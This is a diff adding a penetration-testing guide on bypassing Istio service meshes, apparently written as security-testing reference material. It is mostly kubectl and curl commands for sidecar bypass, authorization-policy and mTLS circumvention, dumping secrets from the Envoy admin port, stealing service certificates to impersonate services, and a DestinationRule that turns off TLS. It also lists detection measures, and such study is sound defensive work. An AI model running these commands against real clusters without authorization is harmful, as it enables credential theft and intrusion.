@@ -1,0 +1,240 @@
+<vulnerability_guide>
+  <title>ISTIO AND SERVICE MESH BYPASS</title>
+
+  <critical>Service meshes like Istio provide security through sidecar proxies, but bypass vulnerabilities allow attackers to circumvent mTLS, authorization policies, and network segmentation. Understanding proxy bypass techniques reveals that "zero trust" isn't automatic - it requires correct configuration at every layer.</critical>
+
+  <scope>
+    - Sidecar proxy bypass
+    - mTLS circumvention
+    - Authorization policy bypass
+    - Envoy misconfiguration exploitation
+    - Pilot/Control plane attacks
+    - Service identity spoofing
+  </scope>
+
+  <methodology>
+    1. SERVICE MESH DETECTION
+       {% raw %}
+       # Detect Istio installation
+       kubectl get pods -n istio-system
+       kubectl get svc -n istio-system
+
+       # Check for sidecar injection
+       kubectl get pods -o jsonpath='{.items[*].spec.containers[*].name}' | tr ' ' '\n' | grep istio
+
+       # Istio version
+       kubectl get deployment -n istio-system istiod -o jsonpath='{.spec.template.spec.containers[0].image}'
+
+       # Envoy version in sidecar
+       kubectl exec -it <pod> -c istio-proxy -- pilot-agent version
+       {% endraw %}
+
+    2. SIDECAR BYPASS
+       {% raw %}
+       # Direct pod IP access (bypassing sidecar)
+
+       # Get pod IP
+       kubectl get pod <target-pod> -o jsonpath='{.status.podIP}'
+
+       # From another pod, access directly
+       curl http://POD_IP:APP_PORT  # Not proxied
+
+       # Application ports not captured by iptables
+       # Check excludeInboundPorts, excludeOutboundPorts
+       kubectl get pod <pod> -o yaml | grep -A5 istio
+
+       # Outbound bypass
+       # Some traffic might not go through proxy:
+       # - DNS (port 53)
+       # - Excluded ports
+       # - Init container network
+       {% endraw %}
+
+    3. AUTHORIZATION POLICY BYPASS
+       {% raw %}
+       # Check authorization policies
+       kubectl get authorizationpolicies -A
+
+       # Common bypass patterns:
+
+       # 1. Source principal not enforced
+       # Policy allows specific namespace
+       # But doesn't verify source identity
+
+       # 2. Request headers not validated
+       # Policy checks X-Custom-Header
+       # Attacker adds header manually
+
+       # 3. Incomplete path matching
+       # Policy: paths: ["/admin"]
+       # Bypass: /admin/, /Admin, /admin?
+
+       # 4. Method bypass
+       # Policy: methods: ["GET"]
+       # Bypass: POST, or GET with body
+       {% endraw %}
+
+    4. mTLS BYPASS
+       {% raw %}
+       # Check mTLS mode
+       kubectl get peerauthentication -A
+
+       # PERMISSIVE mode allows plaintext
+       # Attack: Send HTTP instead of HTTPS
+
+       # From pod without sidecar
+       # Create pod in namespace without injection
+       kubectl label namespace default istio-injection=disabled
+
+       # Direct connection bypasses mTLS
+       curl http://service.namespace.svc.cluster.local:80
+
+       # Check for STRICT vs PERMISSIVE
+       kubectl get peerauthentication default -o yaml
+       {% endraw %}
+
+    5. ENVOY ADMIN INTERFACE
+       {% raw %}
+       # Envoy admin port (usually 15000)
+
+       # Access from within pod
+       kubectl exec -it <pod> -c istio-proxy -- curl localhost:15000
+
+       # Endpoints available:
+       # /config_dump - Full Envoy config
+       # /clusters - Upstream cluster info
+       # /listeners - Listener configuration
+       # /stats - Statistics and metrics
+       # /server_info - Server version and info
+
+       # Config dump contains secrets
+       curl localhost:15000/config_dump | grep -i secret
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <pilot_exploitation>
+      {% raw %}
+      # Istiod (Pilot) is the control plane
+
+      # Check Istiod access
+      kubectl get svc -n istio-system istiod
+
+      # If accessible:
+      # - Push malicious Envoy config
+      # - Modify routing rules
+      # - Access certificates
+
+      # gRPC interface
+      # Default port 15010 (plaintext), 15012 (TLS)
+
+      # XDS API abuse
+      # If you can reach Pilot, request other pods' configs
+      {% endraw %}
+    </pilot_exploitation>
+
+    <certificate_theft>
+      {% raw %}
+      # Service identity certificates
+
+      # Certificates stored in proxy
+      kubectl exec -it <pod> -c istio-proxy -- \
+        cat /etc/certs/cert-chain.pem
+
+      # Or in newer versions
+      kubectl exec -it <pod> -c istio-proxy -- \
+        curl localhost:15000/config_dump | jq '.configs[].dynamic_active_secrets'
+
+      # Use stolen certificate to impersonate service
+      # Connect to other services with stolen identity
+      {% endraw %}
+    </certificate_theft>
+
+    <init_container_bypass>
+      {% raw %}
+      # Init containers run before sidecar
+
+      # If pod has init containers with network access
+      # Traffic bypasses Istio proxy
+
+      # Attack: Malicious init container
+      # Exfiltrates data before proxy starts
+
+      # Check init containers
+      kubectl get pod <pod> -o jsonpath='{.spec.initContainers[*].name}'
+
+      # Network during init
+      # iptables rules not yet applied
+      # Direct network access possible
+      {% endraw %}
+    </init_container_bypass>
+
+    <destination_rule_abuse>
+      {% raw %}
+      # DestinationRules configure client-side policy
+
+      # Check current rules
+      kubectl get destinationrules -A
+
+      # If you can create DestinationRule:
+      apiVersion: networking.istio.io/v1alpha3
+      kind: DestinationRule
+      metadata:
+        name: disable-tls
+      spec:
+        host: "*.default.svc.cluster.local"
+        trafficPolicy:
+          tls:
+            mode: DISABLE  # Turn off mTLS
+
+      # Route to malicious endpoint
+      # MTLS downgrade
+      {% endraw %}
+    </destination_rule_abuse>
+
+    <headless_service_bypass>
+      {% raw %}
+      # Headless services may bypass proxy
+
+      # Headless service: clusterIP: None
+      # Returns pod IPs directly
+
+      # DNS resolves to pod IPs
+      # Client connects directly
+
+      # If policy depends on service routing
+      # Direct pod access may bypass
+
+      # Check for headless services
+      kubectl get svc -o json | jq '.items[] | select(.spec.clusterIP=="None")'
+      {% endraw %}
+    </headless_service_bypass>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor for direct pod-to-pod traffic
+    - Alert on mTLS failures or downgrades
+    - Track authorization policy denies
+    - Watch for Envoy admin port access
+    - Monitor Istiod access logs
+  </detection>
+
+  <validation>
+    - Successfully bypass sidecar proxy
+    - Circumvent authorization policies
+    - Access service without mTLS
+    - Extract configuration from Envoy
+    - Demonstrate policy gaps
+  </validation>
+
+  <pro_tips>
+    - PERMISSIVE mTLS mode is common and allows plaintext
+    - Pods without sidecars can access sidecar-protected services
+    - Envoy admin port on localhost often unrestricted
+    - Authorization policies rarely cover all paths/methods
+    - Init containers have pre-iptables network access
+    - Service account tokens still valid even with mTLS
+  </pro_tips>
+
+  <remember>Service meshes add a security layer but don't replace application security. Istio in PERMISSIVE mode accepts both TLS and plaintext. Authorization policies with incomplete path matching are easily bypassed. Direct pod IP access often circumvents all mesh policies. Always verify that mesh security is actually enforced, not just configured.</remember>
+</vulnerability_guide>
